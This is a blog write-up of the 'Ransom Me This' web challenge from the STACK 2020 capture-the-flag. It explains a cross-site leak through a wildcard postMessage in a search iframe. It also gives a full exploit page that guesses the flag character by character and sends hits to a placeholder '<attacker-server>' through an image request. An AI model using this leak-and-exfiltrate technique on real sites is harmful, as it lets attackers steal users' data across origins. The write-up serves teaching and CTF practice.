---
layout: post
title: STACK the flags 2020 CTF - Ransom Me This
modified:
categories: blog/
excerpt:
tags: []
image:
  feature:
share: true
comments: true
date: 2020-12-11T11:56:30+08:00
---

![]({{site.url|append: site.baseurl}}/resources/images/stack/scoreboard.jpg)

STACK 2020 CTF is a capture the flag [organized by GovTech](https://ctf.tech.gov.sg/). We participated as PwningActionParty and achieved third place in the open category.

# Ransom Me This
**Category:** Web  
**Description:** 
COViD's victims received a link to this portal to submit their ransoms! Can you unlock the keys without paying the ransom?

---

![]({{site.url|append: site.baseurl}}/resources/images/stack/ransom-me-this.png){: width="600px"}

There are two parts to this website:

1. The ransom submission
2. The hacked website search

### The first step is to try to observe the behavior each feature exhibits

***1. The ransom submission***

This makes a POST request to `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41021/` and the response doesn't seem to indicate any difference from the initial landing page.

However, using Burp Collaborator, we can test that a HTTP request is subsequently made to the URL we provided.

{% highlight linenos %}
GET / HTTP/1.1
Host: z44ebo81l5aokow0blhot5cp3g98xx.burpcollaborator.net
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US
{% endhighlight %}

Notice that the user agent implies that this was made from a headless chrome instance, for now, there doesn't seem to be any other interesting behavior for this feature.

***2. The hacked website search***

This feature is located at `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41021/search?q=` and embedded in an iFrame.

{% highlight javascript linenos %}
var numResults = "4"
window.parent.postMessage(numResults, '*');
{% endhighlight %}

From the inline JavaScript on the page, we see that it posts the number of search results as a message to the parent website embedding this iFrame, this is interesting because it specifies a wildcard target origin and the page itself allows being embedded from a different origin than itself. Keep this in mind, this primitive could be useful for leaking information across origins.

From the response of the site, there seems to be encryption key hidden from the search results, probably intentional since we might not be "authenticated" to view them.

### Hypothesis

From the information we have on hand, we can hypothesis where the flag might be located:

1. The HTTP request made from the headless chrome seem to imply that we need to make use of this feature in order to obtain the flag, and that we might need to utilize some browser feature (JavaScript methods, etc).
2. The cross-site information leak primitive seems to imply that we need to embed this page in our final exploit and to use the primitive to leak information on the flag.

Therefore, I can hypothesize that the flag is stored as a hidden encryption key, and we need to load our exploit payload in a website loaded by feature #1, and making use of the cross-site leak to leak the flag in feature #2.

### Exploit

{% highlight html linenos %}
<html>
<body>
<script>
window.onmessage = function(data) {
    success = parseInt(data.data);
    if (success == 0) {
    return;
    }
    var iframes = document.getElementsByTagName('iframe');
    for(var i = 0; i < iframes.length; i++) {
        if(data.source === iframes[i].contentWindow) {
            // Do stuff with iframes[i]
            var img = document.createElement('img')
            img.src = "http://<attacker-server>:8003?" + iframes[i].src;
            document.appendChild(img);
        }
    }
}
window.onload = function() {
    for (var i = 32; i <= 127; i++)  {
         s = String.fromCharCode(i);
         var iframe = document.createElement('iframe');
         iframe.src="http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41021/search?q=<?php echo $_GET['flag'];?>"+s;
         document.body.appendChild(iframe)
    }
}
</script>
</body>
</html>
{% endhighlight %}

This is my final exploit, it makes use of feature #2 to guess the flag character by character, and if the guess is correct, the message data should contain an non-zero integer, and if that happens, we cause a callback to our webserver to inform us.

Hosting this page on a webserver, I post the URL of the exploit page to feature #1 and incrementally guess the flag.

![]({{site.url|append: site.baseurl}}/resources/images/stack/ransom-me-this-guess.png)

Eventually we obtain our flag: `govtech-csg{Se@RcH_@nD_d3sTr0y}`